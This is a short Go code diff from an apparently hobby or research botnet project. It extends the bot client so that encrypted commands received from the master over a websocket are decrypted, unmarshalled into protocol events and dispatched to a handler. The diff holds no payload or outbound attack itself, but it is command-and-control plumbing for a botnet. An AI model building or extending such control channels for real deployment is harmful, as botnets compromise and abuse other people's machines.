@@ -14,6 +14,7 @@ import (
 	"github.com/gorilla/websocket"
 
 	"github.com/adrianosela/botnet/lib/encryption"
+	"github.com/adrianosela/botnet/lib/protocol"
 	"github.com/adrianosela/botnet/master"
 )
 
@@ -113,13 +114,17 @@ func (s *BotnetSlave) Start() {
 			if messageType != 2 {
 				continue
 			}
-			decryptedMessage, err := encryption.DecryptMessage(message, s.slavePrivKey)
+			decryptedJSON, err := encryption.DecryptMessage(message, s.slavePrivKey)
 			if err != nil {
 				log.Printf("could not decrypt binary message: %s", err)
 				continue
 			}
-			log.Printf("received message: %s", decryptedMessage)
-			// TODO: handle command scheme here
+			var e protocol.Event
+			if err := json.Unmarshal(decryptedJSON, &e); err != nil {
+				log.Printf("could not unmarshal json message: %s", err)
+				continue
+			}
+			go protocol.HandleMasterEvent(e)
 		}
 	}()
 
